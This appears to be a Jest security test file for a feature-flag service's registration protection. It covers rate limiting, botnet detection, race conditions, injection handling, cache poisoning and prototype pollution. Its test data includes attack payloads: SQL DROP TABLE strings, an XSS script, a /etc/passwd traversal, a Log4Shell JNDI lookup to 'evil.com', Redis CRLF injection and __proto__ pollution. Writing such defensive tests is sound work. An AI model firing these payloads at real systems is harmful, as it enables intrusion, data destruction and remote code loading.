/**
 * Enhanced Feature Flag Service - Security Tests
 * 
 * Security-focused tests for DDoS protection and vulnerabilities
 */

const { EnhancedFeatureFlagService } = require('../../../src/services/enhancedFeatureFlagService');

// Mock dependencies
const mockDb = {
  query: jest.fn(),
  queryOne: jest.fn(),
  execute: jest.fn()
};

const mockCache = {
  get: jest.fn(),
  set: jest.fn(),
  setex: jest.fn(),
  del: jest.fn(),
  incr: jest.fn(),
  expire: jest.fn(),
  publish: jest.fn(),
  subscribe: jest.fn(),
  keys: jest.fn(),
  isConnected: jest.fn(() => true)
};

const mockAnalyticsService = {
  recordFlagEvaluation: jest.fn()
};

const mockAuditService = {
  log: jest.fn()
};

describe('DDoS Protection Security Tests', () => {
  let service;

  beforeEach(() => {
    jest.clearAllMocks();
    
    mockDb.query.mockResolvedValue([]);
    mockDb.queryOne.mockResolvedValue(null);
    mockDb.execute.mockResolvedValue({ rowsAffected: 1 });
    
    service = new EnhancedFeatureFlagService(
      mockDb,
      mockCache,
      mockAnalyticsService,
      mockAuditService
    );
    
    // Enable self-registration
    service.flags.set('self_registration_enabled', {
      flag_key: 'self_registration_enabled',
      default_value: 'true',
      enabled: 'Y'
    });
    service.registrationProtection.enabled = true;
  });

  describe('DDoS Attack Scenarios', () => {
    it('should block distributed attack from multiple IPs', async () => {
      const attackIPs = [];
      for (let i = 0; i < 256; i++) {
        attackIPs.push(`10.0.0.${i}`);
      }

      // Simulate rapid requests from many IPs
      const results = [];
      for (const ip of attackIPs) {
        // Each IP makes multiple attempts
        for (let attempt = 1; attempt <= 6; attempt++) {
          mockCache.incr.mockResolvedValueOnce(attempt);
          
          if (attempt <= 5) {
            const result = await service.checkRegistrationProtection(ip, `fp_${ip}`);
            results.push(result);
          } else {
            // 6th attempt should be blocked
            await expect(
              service.checkRegistrationProtection(ip, `fp_${ip}`)
            ).rejects.toThrow('Too many registration attempts');
          }
        }
      }

      // Verify rate limiting worked
      expect(mockCache.setex).toHaveBeenCalled();
    });

    it('should detect botnet patterns using common fingerprints', async () => {
      const commonFingerprint = 'botnet_fingerprint_12345';
      const botnetIPs = Array.from({ length: 50 }, (_, i) => `192.168.${Math.floor(i/255)}.${i%255}`);

      // Mock high fingerprint count indicating botnet
      mockDb.queryOne.mockImplementation((sql, params) => {
        if (sql.includes('fingerprint')) {
          return { count: 100 }; // Very high count for same fingerprint
        }
        return { count: 0 };
      });

      for (const ip of botnetIPs.slice(0, 5)) {
        mockCache.incr.mockResolvedValueOnce(1);
        const result = await service.checkRegistrationProtection(ip, commonFingerprint);
        
        // Should require extra verification due to suspicious fingerprint
        expect(result.requireEmailVerification).toBe(true);
        expect(result.suspicionScore).toBeGreaterThan(0.8);
      }
    });

    it('should handle slowloris-style attacks', async () => {
      // Simulate slow, persistent connections
      const ip = '10.10.10.10';
      const promises = [];
      
      // Create 100 slow concurrent requests
      for (let i = 0; i < 100; i++) {
        const slowRequest = new Promise(async (resolve) => {
          // Simulate slow request with delay
          await new Promise(r => setTimeout(r, Math.random() * 1000));
          mockCache.incr.mockResolvedValueOnce(i + 1);
          
          try {
            const result = await service.checkRegistrationProtection(ip, 'slow_fp');
            resolve({ success: true, result });
          } catch (error) {
            resolve({ success: false, error: error.message });
          }
        });
        
        promises.push(slowRequest);
      }
      
      const results = await Promise.all(promises);
      
      // Should block after rate limit
      const blocked = results.filter(r => !r.success);
      expect(blocked.length).toBeGreaterThan(0);
    });

    it('should prevent amplification attacks through error messages', async () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '"; DROP TABLE users; --',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '\x00\x00\x00\x00'
      ];

      for (const input of maliciousInputs) {
        mockCache.incr.mockResolvedValueOnce(1);
        
        // Should sanitize input and not leak information
        const result = await service.checkRegistrationProtection(input, input);
        
        // Should not throw detailed errors that could help attackers
        expect(result).toBeDefined();
        expect(result.allowed).toBeDefined();
      }
    });
  });

  describe('Race Condition Vulnerabilities', () => {
    it('should handle TOCTOU (Time-of-Check-Time-of-Use) attacks', async () => {
      const ip = '10.0.0.1';
      let attemptCount = 0;
      
      // Simulate race condition where multiple requests check before increment
      mockCache.incr.mockImplementation(() => {
        // Simulate delay in increment operation
        return new Promise(resolve => {
          setTimeout(() => {
            attemptCount++;
            resolve(attemptCount);
          }, 10);
        });
      });

      // Fire multiple requests simultaneously
      const promises = Array(10).fill(null).map(() => 
        service.checkRegistrationProtection(ip, 'race_fp')
      );

      const results = await Promise.allSettled(promises);
      
      // Should properly handle concurrent increments
      const successCount = results.filter(r => r.status === 'fulfilled').length;
      expect(successCount).toBeLessThanOrEqual(5); // Should respect rate limit
    });

    it('should prevent double-spend style attacks on rate limits', async () => {
      const ip = '10.0.0.2';
      
      // Mock atomic increment
      let counter = 0;
      mockCache.incr.mockImplementation(() => {
        counter++;
        return Promise.resolve(counter);
      });

      // Attempt to "spend" the same rate limit slot multiple times
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(service.checkRegistrationProtection(ip, 'double_spend'));
      }

      const results = await Promise.allSettled(promises);
      
      // Each attempt should get unique counter value
      expect(counter).toBe(10);
      
      // Later attempts should be blocked
      const blocked = results.filter(r => r.status === 'rejected').length;
      expect(blocked).toBeGreaterThanOrEqual(5);
    });
  });

  describe('Input Validation Security', () => {
    it('should prevent SQL injection in IP addresses', async () => {
      const sqlInjectionAttempts = [
        "192.168.1.1' OR '1'='1",
        "192.168.1.1; DROP TABLE pf_registration_protection;",
        "192.168.1.1' UNION SELECT * FROM users--",
        "192.168.1.1\\'; DROP TABLE users--"
      ];

      for (const maliciousIP of sqlInjectionAttempts) {
        mockCache.incr.mockResolvedValueOnce(1);
        
        // Should handle without executing SQL
        const result = await service.checkRegistrationProtection(maliciousIP, 'test');
        expect(result).toBeDefined();
        
        // Verify no malicious SQL was executed
        if (mockDb.execute.mock.calls.length > 0) {
          const lastCall = mockDb.execute.mock.calls[mockDb.execute.mock.calls.length - 1];
          expect(lastCall[1]).not.toContain('DROP');
          expect(lastCall[1]).not.toContain('UNION');
        }
      }
    });

    it('should prevent NoSQL injection in fingerprints', async () => {
      const noSqlInjectionAttempts = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '[$ne]=1'
      ];

      for (const maliciousFingerprint of noSqlInjectionAttempts) {
        mockCache.incr.mockResolvedValueOnce(1);
        
        const result = await service.checkRegistrationProtection('192.168.1.1', maliciousFingerprint);
        expect(result).toBeDefined();
        
        // Should treat as string, not execute as query
        expect(result.allowed).toBeDefined();
      }
    });

    it('should handle buffer overflow attempts', async () => {
      // Create very large inputs
      const largeIP = '192.168.1.1'.padEnd(10000, '0');
      const largeFingerprint = 'a'.repeat(1000000);
      
      mockCache.incr.mockResolvedValueOnce(1);
      
      // Should handle gracefully without crashing
      const result = await service.checkRegistrationProtection(largeIP, largeFingerprint);
      expect(result).toBeDefined();
    });
  });

  describe('Cache Poisoning Prevention', () => {
    it('should prevent cache key injection', async () => {
      const maliciousKeys = [
        '192.168.1.1\r\nSET malicious:key "hacked"',
        '192.168.1.1*',
        '192.168.1.1${EVIL}',
        '../../../admin'
      ];

      for (const key of maliciousKeys) {
        mockCache.incr.mockResolvedValueOnce(1);
        
        await service.checkRegistrationProtection(key, 'test');
        
        // Verify cache key was properly sanitized
        const incrCalls = mockCache.incr.mock.calls;
        const lastCall = incrCalls[incrCalls.length - 1];
        
        // Should not contain special Redis commands
        expect(lastCall[0]).not.toContain('SET');
        expect(lastCall[0]).not.toContain('\r');
        expect(lastCall[0]).not.toContain('\n');
        expect(lastCall[0]).not.toContain('*');
      }
    });

    it('should validate cache responses', async () => {
      // Mock corrupted cache response
      mockCache.get.mockResolvedValueOnce('{"corrupted": true, "__proto__": {"isAdmin": true}}');
      
      const ip = '192.168.1.1';
      mockCache.incr.mockResolvedValueOnce(1);
      
      // Should handle corrupted data safely
      const result = await service.checkRegistrationProtection(ip, 'test');
      expect(result).toBeDefined();
      expect(result.allowed).toBeDefined();
    });
  });

  describe('Timing Attack Prevention', () => {
    it('should have consistent response times regardless of result', async () => {
      const timings = [];
      
      // Test both allowed and blocked scenarios
      for (let i = 1; i <= 10; i++) {
        mockCache.incr.mockResolvedValueOnce(i);
        
        const start = process.hrtime.bigint();
        
        try {
          await service.checkRegistrationProtection('192.168.1.1', 'timing_test');
        } catch (e) {
          // Blocked
        }
        
        const end = process.hrtime.bigint();
        timings.push(Number(end - start) / 1000000); // Convert to ms
      }
      
      // Calculate standard deviation
      const avg = timings.reduce((a, b) => a + b) / timings.length;
      const variance = timings.reduce((sum, t) => sum + Math.pow(t - avg, 2), 0) / timings.length;
      const stdDev = Math.sqrt(variance);
      
      // Standard deviation should be low (consistent timing)
      expect(stdDev).toBeLessThan(10); // Less than 10ms variation
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    it('should limit memory usage under attack', async () => {
      const memBefore = process.memoryUsage().heapUsed;
      
      // Simulate memory exhaustion attack
      const promises = [];
      for (let i = 0; i < 10000; i++) {
        mockCache.incr.mockResolvedValueOnce(1);
        promises.push(
          service.checkRegistrationProtection(`ip_${i}`, `fp_${i}`)
            .catch(() => {}) // Ignore errors
        );
      }
      
      await Promise.all(promises);
      
      const memAfter = process.memoryUsage().heapUsed;
      const memIncrease = (memAfter - memBefore) / 1024 / 1024; // MB
      
      // Should not use excessive memory
      expect(memIncrease).toBeLessThan(100); // Less than 100MB increase
    });

    it('should prevent CPU exhaustion through regex', async () => {
      // Attempt ReDoS (Regular Expression Denial of Service)
      const maliciousUserAgent = 'a'.repeat(100) + 'X' + 'a'.repeat(100);
      
      mockCache.incr.mockResolvedValueOnce(1);
      mockDb.query.mockResolvedValue([]);
      mockDb.queryOne.mockResolvedValue({ count: 0 });
      
      const start = process.hrtime.bigint();
      await service.calculateSuspicionScore('192.168.1.1', 'test', {
        'user-agent': maliciousUserAgent
      });
      const end = process.hrtime.bigint();
      
      const durationMs = Number(end - start) / 1000000;
      
      // Should complete quickly even with malicious input
      expect(durationMs).toBeLessThan(100);
    });
  });

  describe('Authentication Bypass Prevention', () => {
    it('should not allow bypassing rate limits through header manipulation', async () => {
      const bypassAttempts = [
        { 'X-Forwarded-For': '127.0.0.1' },
        { 'X-Real-IP': 'localhost' },
        { 'CF-Connecting-IP': '::1' },
        { 'X-Originating-IP': '0.0.0.0' }
      ];

      for (const headers of bypassAttempts) {
        mockCache.incr.mockResolvedValueOnce(6); // Over limit
        
        // Should still be blocked despite special headers
        await expect(
          service.checkRegistrationProtection('192.168.1.1', 'bypass_test', headers)
        ).rejects.toThrow('Too many registration attempts');
      }
    });

    it('should not allow privilege escalation through flag manipulation', async () => {
      // Attempt to bypass by manipulating evaluation context
      const maliciousContext = {
        userId: 'admin',
        roles: ['admin', 'super_admin'],
        '__proto__': { isAdmin: true },
        'constructor': { prototype: { isAdmin: true } }
      };

      service.flags.set('admin_only', {
        flag_key: 'admin_only',
        enabled: 'Y',
        targeting_rules: [
          { field: 'isAdmin', operator: 'equals', value: true }
        ],
        default_value: 'false'
      });

      const result = await service.evaluateFlag('admin_only', maliciousContext);
      
      // Should not grant access through prototype pollution
      expect(result.value).toBe(false);
    });
  });
});